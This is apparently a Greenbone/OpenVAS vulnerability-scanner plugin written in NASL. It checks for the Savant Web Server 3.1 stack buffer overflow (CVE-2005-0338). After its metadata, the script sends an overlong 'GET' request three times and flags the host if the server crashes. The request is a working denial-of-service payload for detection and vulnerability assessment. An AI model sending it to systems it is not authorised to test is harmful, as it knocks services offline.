if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802296" );
	script_version( "2020-02-03T13:52:45+0000" );
	script_bugtraq_id( 12429 );
	script_cve_id( "CVE-2005-0338" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-02-03 13:52:45 +0000 (Mon, 03 Feb 2020)" );
	script_tag( name: "creation_date", value: "2012-01-23 14:14:14 +0530 (Mon, 23 Jan 2012)" );
	script_name( "Savant Web Server Remote Buffer Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "gb_savant_webserver_detect.sc" );
	script_mandatory_keys( "savant/webserver/detected" );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the application or cause a denial of service condition." );
	script_tag( name: "affected", value: "Savant Web Server version 3.1." );
	script_tag( name: "insight", value: "The flaw is due to a boundary error when processing malformed
  HTTP request. This can be exploited to cause a stack-based overflow via a long HTTP request." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Savant Web Server and prone to buffer overflow
  vulnerability." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/12429" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/19177" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18401" );
	script_xref( name: "URL", value: "http://marc.info/?l=full-disclosure&m=110725682327452&w=2" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
CPE = "cpe:/a:savant:savant_webserver";
require("host_details.inc.sc");
require("http_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
req = NASLString( "GET \\\\", crap( 254 ), "\\r\\n\\r\\n" );
for(i = 0;i < 3;i++){
	res = http_send_recv( port: port, data: req );
}
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

